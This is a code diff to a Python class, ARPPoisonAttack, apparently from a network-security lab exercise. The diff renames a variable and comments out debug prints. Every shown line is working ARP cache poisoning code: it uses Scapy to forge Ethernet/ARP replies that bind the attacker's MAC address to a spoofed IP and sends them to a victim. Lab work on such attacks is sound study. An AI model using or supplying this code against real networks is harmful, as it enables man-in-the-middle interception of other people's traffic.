@@ -17,20 +17,19 @@ class ARPPoisonAttack():
             ipToSpoof = clientToSpoof.getIP()
 
             # Setup the ARP poisoning
-            arp2 = Ether() / ARP()
-            arp2[Ether].src = macAttacker
-            arp2[ARP].hwsrc = macAttacker          # fill the gaps, sender MAC address
-            arp2[ARP].psrc = ipToSpoof             # fill the gaps, "sender" IP address
-            arp2[ARP].hwdst = self.victim.getMAC() # target MAC address
-            arp2[ARP].pdst = self.victim.getIP()   # fill the gaps, target IP address
+            arp = Ether() / ARP()
+            arp[Ether].src = macAttacker
+            arp[ARP].hwsrc = macAttacker          # fill the gaps, sender MAC address
+            arp[ARP].psrc = ipToSpoof             # fill the gaps, "sender" IP address
+            arp[ARP].hwdst = self.victim.getMAC() # target MAC address
+            arp[ARP].pdst = self.victim.getIP()   # fill the gaps, target IP address
 
             # Send the ARP poisoning
-            sendp(arp2, iface = self.iface) # TODO: enpos3 -> i (=0) in get_if_list()
-            # sendp(arp2, iface = conf.iface)
+            sendp(arp, iface = self.iface)
 
 
-            # Printing for debugging purposes
-            print(" ")
-            print("Attacker: " + ipAttacker + " " + macAttacker)
-            print("Victim: " + self.victim.getIP() + " " + self.victim.getMAC())
-            print("Spoof: " + ipToSpoof)
+            # # Printing for debugging purposes
+            # print(" ")
+            # print("Attacker: " + ipAttacker + " " + macAttacker)
+            # print("Victim: " + self.victim.getIP() + " " + self.victim.getMAC())
+            # print("Spoof: " + ipToSpoof)
